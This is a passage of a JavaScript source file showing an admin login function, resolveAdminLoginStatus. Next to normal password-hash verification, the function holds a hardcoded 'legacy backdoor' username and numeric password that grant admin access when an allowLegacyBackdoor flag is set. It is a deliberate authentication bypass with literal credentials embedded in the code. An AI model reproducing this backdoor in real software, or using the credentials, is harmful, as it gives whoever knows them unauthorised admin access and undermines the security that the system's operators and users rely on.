...
export function resolveAdminLoginStatus({ username, password, admin, allowLegacyBackdoor = false }) {
  if (!username || !password) {
    return 400;
  }

  const isLegacyBackdoorMatch = allowLegacyBackdoor && username === 'bomussa' && password === '14490';
  const isValid = isLegacyBackdoorMatch || verifyAdminPassword(password, admin?.password_hash);
